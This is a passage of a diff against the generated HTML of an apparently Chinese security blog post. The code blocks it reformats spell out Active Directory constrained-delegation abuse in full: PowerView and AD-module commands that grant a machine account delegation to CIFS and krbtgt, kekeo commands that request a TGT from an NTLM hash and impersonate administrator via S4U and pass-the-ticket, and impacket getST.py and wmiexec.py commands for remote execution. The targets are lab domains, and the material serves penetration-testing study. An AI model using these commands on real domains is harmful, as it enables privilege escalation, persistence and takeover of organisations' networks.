-</span><span class="nb"></span><span class="c">#配置PC-MICLE-KIT到owa2013 CIFS服务的约束委派: 4096(WORKSTATION_TRUST_ACCOUNT)+16777216(TRUSTED_TO_AUTH_FOR_DELEGATION)=16781312</span>
-<span class="nb">Set-DomainObject</span> <span class="nb">PC-MICLE</span><span class="n">-KIT</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;msds-allowedtodelegateto&#39;</span><span class="p">=</span><span class="s1">&#39;CIFS/owa2013.rootkit.org&#39;</span><span class="p">;</span><span class="s1">&#39;useraccountcontrol&#39;</span><span class="p">=</span><span class="n">16781312</span><span class="p">}</span> <span class="n">-verbose</span>
-
-<span class="c">#方法二 [Microsoft.ActiveDirectory.Management.dll](&lt;https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll&gt;)</span>
-<span class="nb">Import-module</span> <span class="p">.\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">dll</span>
-<span class="c">#用户的话使用$user = Get-ADUser test</span>
-<span class="nv">$user</span> <span class="p">=</span> <span class="nb">Get-ADComputer</span> <span class="nb">PC-MICLE</span><span class="n">-KIT</span>
-<span class="c">#配置PC-MICLE-KIT到krbtgt服务的约束委派（只能2008及其以前的KDC支持）</span>
-<span class="nb">Set-ADObject</span> <span class="nv">$user</span> <span class="n">-Add</span> <span class="p">@{</span><span class="s2">&#34;msDS-AllowedToDelegateTo&#34;</span> <span class="p">=</span> <span class="p">@(</span><span class="s2">&#34;krbtgt/rootkit.org&#34;</span><span class="p">)}</span> <span class="o">-Replace</span> <span class="p">@{</span><span class="s2">&#34;useraccountcontrol&#34;</span><span class="p">=</span><span class="n">16781312</span><span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#方法一 PowerView</span>
+</span></span><span class="line"><span class="cl"><span class="c">#查看PC-MICLE-KIT机器账号的委派设置情况</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainObject</span> <span class="nb">PC-MICLE</span><span class="n">-KIT</span> <span class="n">-Properties</span> <span class="n">distinguishedname</span><span class="p">,</span><span class="n">useraccountcontrol</span><span class="p">,</span><span class="n">serviceprincipalname</span><span class="p">,</span><span class="nb">msds-allowedtodelegateto</span> <span class="p">|</span><span class="nb">fl
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="c">#配置PC-MICLE-KIT到owa2013 CIFS服务的约束委派: 4096(WORKSTATION_TRUST_ACCOUNT)+16777216(TRUSTED_TO_AUTH_FOR_DELEGATION)=16781312</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-DomainObject</span> <span class="nb">PC-MICLE</span><span class="n">-KIT</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;msds-allowedtodelegateto&#39;</span><span class="p">=</span><span class="s1">&#39;CIFS/owa2013.rootkit.org&#39;</span><span class="p">;</span><span class="s1">&#39;useraccountcontrol&#39;</span><span class="p">=</span><span class="n">16781312</span><span class="p">}</span> <span class="n">-verbose</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#方法二 [Microsoft.ActiveDirectory.Management.dll](&lt;https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll&gt;)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Import-module</span> <span class="p">.\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">dll</span>
+</span></span><span class="line"><span class="cl"><span class="c">#用户的话使用$user = Get-ADUser test</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="p">=</span> <span class="nb">Get-ADComputer</span> <span class="nb">PC-MICLE</span><span class="n">-KIT</span>
+</span></span><span class="line"><span class="cl"><span class="c">#配置PC-MICLE-KIT到krbtgt服务的约束委派（只能2008及其以前的KDC支持）</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-ADObject</span> <span class="nv">$user</span> <span class="n">-Add</span> <span class="p">@{</span><span class="s2">&#34;msDS-AllowedToDelegateTo&#34;</span> <span class="p">=</span> <span class="p">@(</span><span class="s2">&#34;krbtgt/rootkit.org&#34;</span><span class="p">)}</span> <span class="o">-Replace</span> <span class="p">@{</span><span class="s2">&#34;useraccountcontrol&#34;</span><span class="p">=</span><span class="n">16781312</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 </ul>
@@ -646,15 +646,15 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#keko</span>
-<span class="c">#生成TGT票据</span>
-<span class="n">tgt</span><span class="p">::</span><span class="n">ask</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="nb">PC-MICLE</span><span class="n">-KIT</span><span class="p">$</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">ntlm</span><span class="err">:</span><span class="n">a15bc42b9f1f1daa812a0b75a4c775c4</span>
-<span class="c">#发起s4u请求</span>
-<span class="n">tgs</span><span class="p">::</span><span class="n">s4u</span> <span class="p">/</span><span class="n">tgt</span><span class="err">:</span><span class="nb">TGT_PC-MICLE</span><span class="n">-KIT</span><span class="p">$</span><span class="nv">@ROOTKIT</span><span class="p">.</span><span class="n">ORG_krbtgt</span><span class="p">~</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span><span class="nv">@ROOTKIT</span><span class="p">.</span><span class="n">ORG</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">administrator</span><span class="nv">@rootkit</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">CIFS</span><span class="p">/</span><span class="n">owa2013</span><span class="p">.</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span>
-<span class="c">#ptt</span>
-<span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="n">TGS_administrator</span><span class="nv">@rootkit</span><span class="p">.</span><span class="n">org</span><span class="nv">@ROOTKIT</span><span class="p">.</span><span class="n">ORG_CIFS</span><span class="p">~</span><span class="n">owa2013</span><span class="p">.</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span><span class="nv">@ROOTKIT</span><span class="p">.</span><span class="n">ORG</span><span class="p">.</span><span class="n">kirbi</span>
-<span class="nb">dir </span><span class="p">\\</span><span class="n">owa2013</span><span class="p">.</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#keko</span>
+</span></span><span class="line"><span class="cl"><span class="c">#生成TGT票据</span>
+</span></span><span class="line"><span class="cl"><span class="n">tgt</span><span class="p">::</span><span class="n">ask</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="nb">PC-MICLE</span><span class="n">-KIT</span><span class="p">$</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">ntlm</span><span class="err">:</span><span class="n">a15bc42b9f1f1daa812a0b75a4c775c4</span>
+</span></span><span class="line"><span class="cl"><span class="c">#发起s4u请求</span>
+</span></span><span class="line"><span class="cl"><span class="n">tgs</span><span class="p">::</span><span class="n">s4u</span> <span class="p">/</span><span class="n">tgt</span><span class="err">:</span><span class="nb">TGT_PC-MICLE</span><span class="n">-KIT</span><span class="p">$</span><span class="nv">@ROOTKIT</span><span class="p">.</span><span class="n">ORG_krbtgt</span><span class="p">~</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span><span class="nv">@ROOTKIT</span><span class="p">.</span><span class="n">ORG</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">administrator</span><span class="nv">@rootkit</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">CIFS</span><span class="p">/</span><span class="n">owa2013</span><span class="p">.</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span>
+</span></span><span class="line"><span class="cl"><span class="c">#ptt</span>
+</span></span><span class="line"><span class="cl"><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="n">TGS_administrator</span><span class="nv">@rootkit</span><span class="p">.</span><span class="n">org</span><span class="nv">@ROOTKIT</span><span class="p">.</span><span class="n">ORG_CIFS</span><span class="p">~</span><span class="n">owa2013</span><span class="p">.</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span><span class="nv">@ROOTKIT</span><span class="p">.</span><span class="n">ORG</span><span class="p">.</span><span class="n">kirbi</span>
+</span></span><span class="line"><span class="cl"><span class="nb">dir </span><span class="p">\\</span><span class="n">owa2013</span><span class="p">.</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 <li>
@@ -668,11 +668,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">python3</span> <span class="n">getST</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.1.10</span> <span class="o">-</span><span class="n">spn</span> <span class="n">krbtgt</span><span class="o">/</span><span class="mi">0</span><span class="n">day</span><span class="o">.</span><span class="n">org</span> <span class="o">-</span><span class="n">impersonate</span> <span class="n">administrator</span> <span class="mi">0</span><span class="n">day</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">PC</span><span class="o">-</span><span class="n">JACK</span><span class="o">-</span><span class="mi">0</span><span class="n">DAY</span><span class="err">$</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="mi">35</span><span class="n">c7a1ec7ab4df8d073abe65e5375f3a</span>
-<span class="c1">#这里的krbtgt的TGS票据，相当于TGT票据</span>
-<span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">administrator</span><span class="o">.</span><span class="n">ccache</span>
-<span class="n">python3</span> <span class="n">wmiexec</span><span class="o">.</span><span class="n">py</span> <span class="mi">0</span><span class="n">day</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">administrator</span><span class="nd">@OWA2010SP3</span><span class="mf">.0</span><span class="n">day</span><span class="o">.</span><span class="n">org</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span> <span class="o">-</span><span class="n">k</span> 
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">getST</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.1.10</span> <span class="o">-</span><span class="n">spn</span> <span class="n">krbtgt</span><span class="o">/</span><span class="mi">0</span><span class="n">day</span><span class="o">.</span><span class="n">org</span> <span class="o">-</span><span class="n">impersonate</span> <span class="n">administrator</span> <span class="mi">0</span><span class="n">day</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">PC</span><span class="o">-</span><span class="n">JACK</span><span class="o">-</span><span class="mi">0</span><span class="n">DAY</span><span class="err">$</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="mi">35</span><span class="n">c7a1ec7ab4df8d073abe65e5375f3a</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#这里的krbtgt的TGS票据，相当于TGT票据</span>
+</span></span><span class="line"><span class="cl"><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">administrator</span><span class="o">.</span><span class="n">ccache</span>
+</span></span><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">wmiexec</span><span class="o">.</span><span class="n">py</span> <span class="mi">0</span><span class="n">day</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">administrator</span><span class="nd">@OWA2010SP3</span><span class="mf">.0</span><span class="n">day</span><span class="o">.</span><span class="n">org</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span> <span class="o">-</span><span class="n">k</span> 
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 </ul>
